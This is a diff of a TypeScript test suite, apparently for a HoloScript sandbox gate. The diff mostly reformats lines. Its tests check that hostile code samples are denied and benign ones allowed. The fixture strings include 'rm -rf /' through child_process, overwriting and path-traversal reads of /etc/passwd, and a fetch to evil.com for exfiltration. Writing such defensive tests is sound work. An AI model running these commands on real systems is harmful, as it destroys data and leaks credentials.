@@ -42,11 +42,13 @@ const HOSTILE_HOLO_EVAL = 'orb evil { method init() { eval("process.exit(0)") } 
 
 const HOSTILE_HOLO_FS = 'orb evil { method init() { fs.writeFileSync("/etc/passwd", "pwned") } }';
 
-const HOSTILE_HOLO_REQUIRE = 'orb evil { method init() { require("child_process").exec("rm -rf /") } }';
+const HOSTILE_HOLO_REQUIRE =
+  'orb evil { method init() { require("child_process").exec("rm -rf /") } }';
 
 const HOSTILE_HOLO_FETCH = 'orb evil { method init() { fetch("https://evil.com/exfil") } }';
 
-const HOSTILE_HOLO_PATH_TRAVERSAL = 'orb evil { method init() { fs.readFileSync("../../../etc/passwd") } }';
+const HOSTILE_HOLO_PATH_TRAVERSAL =
+  'orb evil { method init() { fs.readFileSync("../../../etc/passwd") } }';
 
 const HOSTILE_HOLO_UNKNOWN_COMPILER = '@compiler version "99.0.0"\norb x {}';
 
@@ -56,11 +58,7 @@ const HOSTILE_HOLO_NONCANONICAL_IMPORT = 'import { evil } from "@evil/package";\
 
 // ── Helpers ────────────────────────────────────────────────────────────────────
 
-async function callTool(
-  name: string,
-  args: Record<string, unknown>,
-  ctx?: SigningContext
-) {
+async function callTool(name: string, args: Record<string, unknown>, ctx?: SigningContext) {
   return handleTool(name, args, ctx ?? mockSigningCtx);
 }
 
@@ -72,9 +70,7 @@ function expectBlocked(result: unknown, checkName?: string) {
   expect(r.error).toContain('ForkSandboxGate denied');
   if (checkName) {
     expect(r.checks).toEqual(
-      expect.arrayContaining([
-        expect.objectContaining({ name: checkName, passed: false }),
-      ])
+      expect.arrayContaining([expect.objectContaining({ name: checkName, passed: false })])
     );
   }
   expect(r.receiptId).toBeDefined();
@@ -139,7 +135,8 @@ describe('canary: benign fork samples pass the gate', () => {
   });
 
   it('CANARY-B005: benign code with @security_sandbox and import', async () => {
-    const code = 'import { securitySandbox } from "@holoscript/security-sandbox";\norb x { @security_sandbox }';
+    const code =
+      'import { securitySandbox } from "@holoscript/security-sandbox";\norb x { @security_sandbox }';
     const result = await callTool('parse_hs', { code });
     expectAllowed(result);
   });
@@ -381,7 +378,11 @@ describe('canary: denial receipts are complete and actionable', () => {
     expectBlocked(result);
     const receiptId = (result as Record<string, unknown>).receiptId as string;
     // Force expiry by manipulating the store directly
-    const entry = (globalReceiptStore as unknown as { store: Map<string, { receipt: unknown; expiresAt: number }> }).store.get(receiptId);
+    const entry = (
+      globalReceiptStore as unknown as {
+        store: Map<string, { receipt: unknown; expiresAt: number }>;
+      }
+    ).store.get(receiptId);
     expect(entry).toBeDefined();
     entry!.expiresAt = Date.now() - 1;
     const expired = globalReceiptStore.get(receiptId);
